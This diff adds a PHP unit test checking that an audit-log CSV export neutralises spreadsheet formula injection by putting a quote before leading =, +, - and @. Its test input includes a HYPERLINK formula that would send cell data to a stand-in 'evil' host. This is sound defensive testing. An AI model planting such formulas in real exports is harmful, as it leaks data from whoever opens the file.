@@ -55,4 +55,30 @@ class AdminAuditLogControllerTest extends TestCase
         $this->assertSame('al.tenant_id = ?', $where);
         $this->assertSame([7], $params);
     }
+
+    private function putRowToString(array $row): string
+    {
+        $controller = app(AdminAuditLogController::class);
+        $method = new \ReflectionMethod($controller, 'putRow');
+        $handle = fopen('php://temp', 'r+');
+        $method->invoke($controller, $handle, $row);
+        rewind($handle);
+        $out = stream_get_contents($handle);
+        fclose($handle);
+        return $out;
+    }
+
+    public function test_putRow_neutralises_formula_injection_in_attacker_fields(): void
+    {
+        // A malicious User-Agent (fully attacker-controlled) that would
+        // execute in Excel must be prefixed with a single quote.
+        $line = $this->putRowToString([1, '=HYPERLINK("http://evil/?"&A1,"x")', '+SUM(A1)', '-2+3', '@cmd', 'normal']);
+
+        $this->assertStringContainsString("'=HYPERLINK", $line);
+        $this->assertStringContainsString("'+SUM(A1)", $line);
+        $this->assertStringContainsString("'-2+3", $line);
+        $this->assertStringContainsString("'@cmd", $line);
+        // A benign value is left untouched (no stray leading quote).
+        $this->assertStringNotContainsString("'normal", $line);
+    }
 }
